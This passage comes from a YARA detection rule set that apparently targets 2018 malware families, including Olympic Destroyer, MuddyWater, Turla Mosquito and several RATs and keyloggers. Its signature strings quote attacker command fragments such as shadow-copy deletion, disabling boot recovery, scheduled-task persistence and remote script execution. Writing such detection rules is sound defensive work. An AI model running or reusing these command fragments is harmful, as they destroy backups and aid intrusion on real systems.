      $s4 = "EXITGNG" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and ( $x1 or 2 of them )
} 

rule TSCookie_RAT_RID2B58 : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects TSCookie RAT"
      author = "Florian Roth"
      reference = "http://blog.jpcert.or.jp/2018/03/malware-tscooki-7aa0.html"
      date = "2018-03-06 09:02:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      required_modules = "pe"
      minimum_yara = "3.0.0"
      
   strings:
      $x1 = "[-] DecryptPassword_Outlook failed(err=%d)" fullword ascii
      $x2 = "----------------------- Firefox Passwords ------------------" fullword ascii
      $x3 = "--------------- Outlook Passwords ------------------" fullword ascii
      $x4 = "----------------------- IE Passwords ------------------" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and ( ( pe.exports ( "DoWork" ) and pe.exports ( "PrintF" ) ) or 1 of them )
} 

rule CrimsonRAT_Mar18_1_RID2D4B : DEMO EXE FILE MAL T1082 T1113 T1136 {
   meta:
      description = "Detects CrimsonRAT malware"
      author = "Florian Roth"
      reference = "Internal Research"
      date = "2018-03-06 10:25:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1082, T1113, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run|" wide
      $x2 = "\\Release\\RTLBot.pdb" ascii
      $x3 = "cmd.exe/c systeminfo >> 1.txt" fullword wide
      $x4 = "/online >> Get online target with important info" fullword wide
      $x5 = "/screen >> ScreenShot from target PC" fullword wide
      $x6 = "/restart >> Restart Target PC" fullword wide
      $x7 = "/log_key >> Get log key file" fullword wide
      $a1 = "get_ShiftKey" fullword ascii
      $a2 = "get_ControlKey" fullword ascii
      $a3 = "get_AltKey" fullword ascii
      $a4 = "get_MineInterval" fullword ascii
      $fp1 = "Copyright Software Secure" wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and ( 1 of ( $x* ) or all of ( $a* ) ) and not 1 of ( $fp* )
} 

rule Gsecdump_password_dump_file_RID322F : DEMO FILE SUSP T1003 T1136 {
   meta:
      description = "Detects a gsecdump output file"
      author = "Florian Roth"
      reference = "https://t.co/OLIj1yVJ4m"
      date = "2018-03-06 13:54:21"
      score = 65
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, SUSP, T1003, T1136"
      minimum_yara = "3.2.0"
      
   strings:
      $x1 = "Administrator(current):500:" ascii
   condition: 
      uint32be ( 0 ) == 0x41646d69 and filesize < 3000 and $x1 at 0
} 

rule OpHoneybee_MaoCheng_Dropper_RID319B : APT DEMO EXE FILE MAL T1035 T1136 {
   meta:
      description = "Detects MaoCheng dropper from Operation Honeybee"
      author = "Florian Roth"
      reference = "https://goo.gl/JAHZVL"
      date = "2018-03-03 13:29:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, MAL, T1035, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "\\MaoCheng\\Release\\" ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 600KB and 1 of them
} 

rule HoneyBee_Dropper_MalDoc_RID2FEA : APT DEMO FILE MAL T1035 T1047 T1057 T1136 {
   meta:
      description = "Detects samples from Operation Honeybee"
      author = "Florian Roth"
      reference = "https://goo.gl/JAHZVL"
      date = "2018-03-03 12:17:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, MAL, T1035, T1047, T1057, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "cmd /c expand %TEMP%\\setup.cab -F:* %SystemRoot%\\System32" 
      $x2 = "del /f /q %TEMP%\\setup.cab && cliconfg.exe" 
      $s1 = "SELECT * FROM Win32_Processor" fullword ascii
      $s2 = "\"cmd /c `wusa " fullword ascii
      $s3 = "sTempPathP" fullword ascii
      $s4 = "sTempFile" fullword ascii
      $s5 = "GetObjectz" fullword ascii
      $s6 = "\\setup.cab" fullword ascii
   condition: 
      uint16 ( 0 ) == 0xcfd0 and filesize < 400KB and ( 1 of ( $x* ) or 4 of them )
} 

rule OpHoneybee_Malware_1_RID2EB7 : APT DEMO EXE FILE MAL T1035 T1082 T1136 {
   meta:
      description = "Detects malware from Operation Honeybee"
      author = "Florian Roth"
      reference = "https://goo.gl/JAHZVL"
      date = "2018-03-03 11:26:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, EXE, FILE, MAL, T1035, T1082, T1136"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   strings:
      $x1 = "cmd /c taskkill /im cliconfg.exe /f /t && del /f /q" fullword ascii
      $x2 = "\\FTPCom_vs10\\Release\\Engine.pdb" ascii
      $x3 = "KXU/yP=B29tLzidqNRuf-SbVInw0oCrmWZk6OpFc7A5GTD1QxaJ3H8h4jMeEsYglv" fullword ascii
      $x4 = "D:\\Task\\MiMul\\" ascii
      $s1 = "[DLL_PROCESS_ATTACH]" fullword ascii
      $s2 = "cmd /c systeminfo >%s" fullword ascii
      $s3 = "post.txt" fullword ascii
      $s4 = "\\temp.ini" fullword ascii
      $s5 = "[GetFTPAccountInfo_10001712]" fullword ascii
      $s6 = "ComSysAppMutex" fullword ascii
      $s7 = "From %s (%02d-%02d %02d-%02d-%02d).txt" fullword ascii
      $s8 = "%s %s %c%s%c" fullword ascii
      $s9 = "TO EVERYONE" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and ( pe.imphash ( ) == "e14b59a79999cc0bc589a4cb5994692a" or pe.imphash ( ) == "64400f452e2f60305c341e08f217b02c" or 1 of ( $x* ) or 3 of them )
} 

rule Sofacy_Trojan_Loader_Feb18_1_RID315E : DEMO EXE FILE G0007 MAL RUSSIA T1136 {
   meta:
      description = "Sofacy Activity Feb 2018"
      author = "Florian Roth"
      reference = "https://www.reverse.it/sample/e3399d4802f9e6d6d539e3ae57e7ea9a54610a7c4155a6541df8e94d67af086e?environmentId=100"
      date = "2018-03-01 13:19:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, G0007, MAL, RUSSIA, T1136"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   strings:
      $x1 = "%appdata%\\nad.dll" fullword wide
      $s3 = "%appdata%\\nad.bat" fullword wide
      $s1 = "apds.dll" fullword ascii
      $s2 = "nad.dll\"" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and ( pe.imphash ( ) == "a2d1be6502b4b3c28959a4fb0196ea45" or pe.exports ( "VidBitRpl" ) or 1 of ( $x* ) or 2 of them )
} 

rule MuddyWater_Mal_Doc_Feb18_1_RID306A : DEMO FILE G0069 MAL T1136 {
   meta:
      description = "Detects malicious document used by MuddyWater"
      author = "Florian Roth"
      reference = "Internal Research - TI2T"
      date = "2018-02-26 12:38:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, G0069, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "aWV4KFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVuaWNvZGUuR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmco" ascii
      $x2 = "U1FCdUFIWUFid0JyQUdVQUxRQkZBSGdBY0FCeUFHVUFjd0J6QUdrQWJ3QnVBQ0FBS" 
   condition: 
      uint16 ( 0 ) == 0xcfd0 and filesize < 3000KB and 1 of them
} 

rule MuddyWater_Mal_Doc_Feb18_2_RID306B : DEMO FILE G0069 MAL T1136 {
   meta:
      description = "Detects malicious document used by MuddyWater"
      author = "Florian Roth"
      reference = "Internal Research - TI2T"
      date = "2018-02-26 12:39:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, G0069, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "*\\G{00020430-0000-0000-C000-000000000046}#2.0#0#C:\\Windows\\System32\\stdole2.tlb#OLE Automation" fullword wide
      $s2 = "*\\G{2DF8D04C-5BFA-101B-BDE5-00AA0044DE52}#2.8#0#C:\\Program Files\\Common Files\\Microsoft Shared\\OFFICE16\\MSO.DLL#Microsoft " wide
      $s3 = "*\\G{00020905-0000-0000-C000-000000000046}#8.7#0#C:\\Program Files\\Microsoft Office\\Office16\\MSWORD.OLB#Microsoft Word 16.0 O" wide
      $s4 = "scripting.filesystemobject$" fullword ascii
      $s5 = "ID=\"{00000000-0000-0000-0000-000000000000}\"" fullword ascii
   condition: 
      uint16 ( 0 ) == 0xcfd0 and filesize < 6000KB and all of them
} 

rule IceFog_Malware_Feb18_1_RID2ECB : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects IceFog malware"
      author = "Florian Roth"
      reference = "https://twitter.com/ClearskySec/status/968104465818669057"
      date = "2018-02-26 11:29:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "cmd /c %c%s%c" fullword ascii
      $s2 = "temp.bat" fullword ascii
      $s3 = "c:\\windows\\debug\\wia\\help" fullword wide
      $s4 = "/getorder.aspx?hostname=" fullword wide
      $s5 = "\\filecfg_temp.dat" fullword wide
      $s6 = "Unknown operating system " fullword wide
      $s7 = "kastygost.compress.to" fullword wide
      $s8 = "/downloads/" fullword wide
      $s9 = "\\key.dat" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and 4 of them
} 

rule TurlaMosquito_Mal_1_RID2E83 : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects malware sample from Turla Mosquito report"
      author = "Florian Roth"
      reference = "https://www.welivesecurity.com/wp-content/uploads/2018/01/ESET_Turla_Mosquito.pdf"
      date = "2018-02-22 11:17:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   strings:
      $s1 = "Pipetp" fullword ascii
      $s2 = "EStOpnabn" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and ( pe.imphash ( ) == "169d4237c79549303cca870592278f42" or all of them )
} 

rule TurlaMosquito_Mal_2_RID2E84 : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects malware sample from Turla Mosquito report"
      author = "Florian Roth"
      reference = "https://www.welivesecurity.com/wp-content/uploads/2018/01/ESET_Turla_Mosquito.pdf"
      date = "2018-02-22 11:17:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   strings:
      $s1 = ".?AVFileNameParseException@ExecuteFile@@" fullword ascii
      $s3 = "no_address" fullword wide
      $s6 = "SRRRQP" fullword ascii
      $s7 = "QWVPQQ" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 600KB and ( pe.imphash ( ) == "cd918073f209c5da7a16b6c125d73746" or all of them )
} 

rule TurlaMosquito_Mal_3_RID2E85 : DEMO EXE FILE MAL T1047 T1136 {
   meta:
      description = "Detects malware sample from Turla Mosquito report"
      author = "Florian Roth"
      reference = "https://www.welivesecurity.com/wp-content/uploads/2018/01/ESET_Turla_Mosquito.pdf"
      date = "2018-02-22 11:18:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1047, T1136"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   strings:
      $x1 = "InstructionerDLL.dll" fullword ascii
      $s1 = "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36" fullword wide
      $s2 = "/scripts/m/query.php?id=" fullword wide
      $s3 = "SELECT * FROM AntiVirusProduct" fullword ascii
      $s4 = "Microsoft Update" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and ( pe.imphash ( ) == "88488fe0b8bcd6e379dea6433bb5d7d8" or ( pe.exports ( "InstallRoutineW" ) and pe.exports ( "StartRoutine" ) ) or $x1 or 3 of them )
} 

rule TurlaMosquito_Mal_4_RID2E86 : DEMO EXE FILE MAL {
   meta:
      description = "Detects malware sample from Turla Mosquito report"
      author = "Florian Roth"
      reference = "https://www.welivesecurity.com/wp-content/uploads/2018/01/ESET_Turla_Mosquito.pdf"
      date = "2018-02-22 11:18:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 800KB and pe.imphash ( ) == "17b328245e2874a76c2f46f9a92c3bad"
} 

rule TurlaMosquito_Mal_5_RID2E87 : DEMO EXE FILE MAL {
   meta:
      description = "Detects malware sample from Turla Mosquito report"
      author = "Florian Roth"
      reference = "https://www.welivesecurity.com/wp-content/uploads/2018/01/ESET_Turla_Mosquito.pdf"
      date = "2018-02-22 11:18:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 300KB and pe.imphash ( ) == "ac40cf7479f53a4754ac6481a4f24e57"
} 

rule TurlaMosquito_Mal_6_RID2E88 : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects malware sample from Turla Mosquito report"
      author = "Florian Roth"
      reference = "https://www.welivesecurity.com/wp-content/uploads/2018/01/ESET_Turla_Mosquito.pdf"
      date = "2018-02-22 11:18:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $a1 = "/scripts/m/query.php?id=" fullword wide
      $a2 = "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36" fullword wide
      $a3 = "GetUserNameW fails" fullword wide
      $s1 = "QVSWQQ" fullword ascii
      $s2 = "SRRRQP" fullword ascii
      $s3 = "QSVVQQ" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and ( 2 of ( $a* ) or 4 of them )
} 

rule TurlaMosquito_Mal_7_RID2E89 : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects malware sample from Turla Mosquito report"
      author = "Florian Roth"
      reference = "https://www.welivesecurity.com/wp-content/uploads/2018/01/ESET_Turla_Mosquito.pdf"
      date = "2018-02-22 11:18:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   strings:
      $x1 = "Logger32.dll" fullword ascii
      $s6 = "lManager::Execute : CPalExceptio" fullword wide
      $s19 = "CCommandSender::operator(" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and ( pe.imphash ( ) == "073235ae6dfbb1bf5db68a039a7b7726" or 3 of them )
} 

rule Nanocore_RAT_Feb18_1_RID2DF1 : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects Nanocore RAT"
      author = "Florian Roth"
      reference = "Internal Research - T2T"
      date = "2018-02-19 10:53:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "NanoCore Client.exe" fullword ascii
      $x2 = "NanoCore.ClientPluginHost" fullword ascii
      $s1 = "PluginCommand" fullword ascii
      $s2 = "FileCommand" fullword ascii
      $s3 = "PipeExists" fullword ascii
      $s4 = "PipeCreated" fullword ascii
      $s5 = "IClientLoggingHost" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 600KB and ( 1 of ( $x* ) or 5 of them )
} 

rule Nanocore_RAT_Feb18_2_RID2DF2 : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects Nanocore RAT"
      author = "Florian Roth"
      reference = "Internal Research - T2T"
      date = "2018-02-19 10:53:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "ResManagerRunnable" fullword ascii
      $s2 = "TransformRunnable" fullword ascii
      $s3 = "MethodInfoRunnable" fullword ascii
      $s4 = "ResRunnable" fullword ascii
      $s5 = "RunRunnable" fullword ascii
      $s6 = "AsmRunnable" fullword ascii
      $s7 = "ReadRunnable" fullword ascii
      $s8 = "ExitRunnable" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and all of them
} 

rule LokiBot_Dropper_ScanCopyPDF_Feb18_RID332E : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Semiautomatically generated YARA rule - file Scan Copy.pdf.com"
      author = "Florian Roth"
      reference = "https://app.any.run/tasks/401df4d9-098b-4fd0-86e0-7a52ce6ddbf5"
      date = "2018-02-14 14:36:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "Win32           Scan Copy.pdf   " fullword wide
      $a1 = "C:\\Program Files (x86)\\Microsoft Visual Studio\\VB98\\VB6.OLB" fullword ascii
      $s1 = "Compiling2.exe" fullword wide
      $s2 = "Unstalled2" fullword ascii
      $s3 = "Compiling.exe" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and $x1 or ( $a1 and 1 of ( $s* ) )
} 

rule LokiBot_Dropper_Packed_R11_Feb18_RID328F : DEMO FILE MAL T1045 T1136 {
   meta:
      description = "Semiautomatically generated YARA rule - file scan copy.pdf.r11"
      author = "Florian Roth"
      reference = "https://app.any.run/tasks/401df4d9-098b-4fd0-86e0-7a52ce6ddbf5"
      date = "2018-02-14 14:10:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, FILE, MAL, T1045, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "C:\\Program Files (x86)\\Microsoft Visual Studio\\VB98\\VB6.OLB" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x0000 and filesize < 2000KB and 1 of them
} 

rule HawkEye_Keylogger_Feb18_1_RID302C : DEMO EXE FILE MAL T1056 T1136 {
   meta:
      description = "Semiautomatically generated YARA rule"
      author = "Florian Roth"
      reference = "https://app.any.run/tasks/ae2521dd-61aa-4bc7-b0d8-8c85ddcbfcc9"
      date = "2018-02-12 12:28:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1056, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "UploadReportLogin.asmx" fullword wide
      $s2 = "tmp.exe" fullword wide
      $s3 = "%appdata%\\" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and all of them
} 

rule Destructive_Ransomware_Gen1_RID31CB : CRIME DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects destructive malware"
      author = "Florian Roth"
      reference = "http://blog.talosintelligence.com/2018/02/olympic-destroyer.html"
      date = "2018-02-12 13:37:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CRIME, DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "/set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no" fullword wide
      $x2 = "delete shadows /all /quiet" fullword wide
      $x3 = "delete catalog -quiet" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 1 of them
} 

rule OlympicDestroyer_Gen2_RID2F5A : DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects Olympic Destroyer malware"
      author = "Florian Roth"
      reference = "http://blog.talosintelligence.com/2018/02/olympic-destroyer.html"
      date = "2018-02-12 11:53:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, EXE, FILE, MAL, T1136"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   strings:
      $x1 = "cmd.exe /c (ping 0.0.0.0 > nul) && if exist %programdata%\\evtchk.txt" fullword wide
      $x2 = "cmd.exe /c (echo strPath = Wscript.ScriptFullName & echo.Set FSO = CreateObject^(\"Scripting.FileSystemObject\"^)" wide
      $x3 = "del %programdata%\\evtchk.txt" fullword wide
      $x4 = "Pyeongchang2018.com\\svc_all_swd_installc" fullword ascii
      $s1 = "<STARTCRED>" fullword wide
      $s2 = "SELECT ds_cn FROM ds_computer" fullword wide
      $s3 = "\\system32\\notepad.exe" fullword wide
      $s4 = "%s \\\\%s -u \"%s\" -p \"%s\" -accepteula -d %s %s \"%s\"" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 5000KB and ( pe.imphash ( ) == "fd7200dcd5c0d9d4d277a26d951210aa" or pe.imphash ( ) == "975087e9286238a80895b195efb3968d" or pe.imphash ( ) == "da1c2d7acfe54df797bfb1f470257bc3" or 1 of ( $x* ) or 3 of them )
} 

rule VBS_Obfuscated_Mal_Feb18_1_RID3039 : DEMO SCRIPT T1027 T1064 T1136 {
   meta:
      description = "Detects malicious obfuscated VBS observed in February 2018"
      author = "Florian Roth"
      reference = "https://goo.gl/zPsn83"
      date = "2018-02-12 12:30:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "DEMO, SCRIPT, T1027, T1064, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "A( Array( (1* 2^1 )+" ascii
      $x2 = ".addcode(A( Array(" ascii
      $x3 = "false:AA.send:Execute(AA.responsetext):end" ascii
      $x4 = "& A( Array(  (1* 2^1 )+" ascii
      $s1 = ".SYSTEMTYPE:NEXT:IF (UCASE(" ascii
      $s2 = "A = STR:next:end function" ascii
      $s3 = "&WSCRIPT.SCRIPTFULLNAME&CHR" fullword ascii
   condition: 
      filesize < 600KB and ( 1 of ( $x* ) or 3 of them )
} 

rule CN_disclosed_20180208_lsls_RID2FCC : CHINA DEMO FILE MAL T1136 {
   meta:
      description = "Detects malware from disclosed CN malware set"
      author = "Florian Roth"
      reference = "https://twitter.com/cyberintproject/status/961714165550342146"
      date = "2018-02-08 12:12:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "User-Agent: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x457f and filesize < 3000KB and $x1
} 

rule CN_disclosed_20180208_c_RID2E71 : CHINA DEMO EXE FILE MAL T1047 T1053 T1136 {
   meta:
      description = "Detects malware from disclosed CN malware set"
      author = "Florian Roth"
      reference = "https://twitter.com/cyberintproject/status/961714165550342146"
      date = "2018-02-08 11:14:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, MAL, T1047, T1053, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "cmd.exe /c ping 0 -n 2 & del \"" fullword wide
      $x2 = "schtasks /create /sc minute /mo 1 /tn Server /tr " fullword wide
      $x3 = "www.upload.ee/image/" wide
      $s1 = "winmgmts:\\\\.\\root\\SecurityCenter2" fullword wide
      $s2 = "/Server.exe" fullword wide
      $s3 = "Executed As " fullword wide
      $s4 = "WmiPrvSE.exe" fullword wide
      $s5 = "Stub.exe" fullword ascii
      $s6 = "Download ERROR" fullword wide
      $s7 = "shutdown -r -t 00" fullword wide
      $s8 = "Select * From AntiVirusProduct" fullword wide
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and ( 1 of ( $x* ) or 4 of them )
} 

rule CN_disclosed_20180208_System3_RID30C6 : CHINA DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects malware from disclosed CN malware set"
      author = "Florian Roth"
      reference = "https://twitter.com/cyberintproject/status/961714165550342146"
      date = "2018-02-08 12:54:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
      $a1 = "WmiPrvSE.exe" fullword wide
      $s1 = "C:\\Users\\sgl\\AppData\\Local\\" ascii
      $s2 = "Temporary Projects\\WmiPrvSE\\" ascii
      $s3 = "$15a32a5d-4906-458a-8f57-402311afc1c1" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and $a1 and 1 of ( $s* )
} 

rule CN_disclosed_20180208_Mal1_RID2F59 : CHINA DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects malware from disclosed CN malware set"
      author = "Florian Roth"
      reference = "https://www.virustotal.com/graph/#/selected/n120z79z208z189/drawer/graph-details"
      date = "2018-02-08 11:53:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, MAL, T1136"
      required_modules = "pe"
      minimum_yara = "3.2.0"
      
   strings:
      $x1 = "%SystemRoot%\\system32\\termsrvhack.dll" fullword ascii
      $x2 = "User-Agent:Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)" fullword ascii
      $a1 = "taskkill /f /im cmd.exe" fullword ascii
      $a2 = "taskkill /f /im mstsc.exe" fullword ascii
      $a3 = "taskkill /f /im taskmgr.exe" fullword ascii
      $a4 = "taskkill /f /im regedit.exe" fullword ascii
      $a5 = "taskkill /f /im mmc.exe" fullword ascii
      $s1 = "K7TSecurity.exe" fullword ascii
      $s2 = "ServUDaemon.exe" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 2000KB and ( pe.imphash ( ) == "28e3a58132364197d7cb29ee104004bf" or 1 of ( $x* ) or 3 of them )
} 

rule CN_disclosed_20180208_KeyLogger_1_RID3227 : CHINA DEMO EXE FILE MAL T1056 T1136 {
   meta:
      description = "Detects malware from disclosed CN malware set"
      author = "Florian Roth"
      reference = "https://www.virustotal.com/graph/#/selected/n120z79z208z189/drawer/graph-details"
      date = "2018-02-08 13:53:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, MAL, T1056, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x2 = "Process already elevated." fullword wide
      $x3 = "GetKeyloggErLogsResponse" fullword ascii
      $x4 = "get_encryptedPassword" fullword ascii
      $x5 = "DoDownloadAndExecute" fullword ascii
      $x6 = "GetKeyloggeRLogs" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 1000KB and 2 of them
} 

rule CN_disclosed_20180208_Mal4_RID2F5C : CHINA DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects malware from disclosed CN malware set"
      author = "Florian Roth"
      reference = "https://www.virustotal.com/graph/#/selected/n120z79z208z189/drawer/graph-details"
      date = "2018-02-08 11:53:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, MAL, T1136"
      required_modules = "pe"
      minimum_yara = "3.0.0"
      
   strings:
      $s1 = "Microsoft .Net Framework COM+ Support" fullword ascii
      $s2 = "Microsoft .NET and Windows XP COM+ Integration with SOAP" fullword ascii
   condition: 
      uint16 ( 0 ) == 0x5a4d and filesize < 3000KB and 1 of them and pe.exports ( "SPACE" )
} 

rule CN_disclosed_20180208_Mal5_RID2F5D : CHINA DEMO EXE FILE MAL T1136 {
   meta:
      description = "Detects malware from disclosed CN malware set"
      author = "Florian Roth"
      reference = "https://www.virustotal.com/graph/#/selected/n120z79z208z189/drawer/graph-details"
      date = "2018-02-08 11:54:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "CHINA, DEMO, EXE, FILE, MAL, T1136"
      minimum_yara = "1.7"
      
   strings:
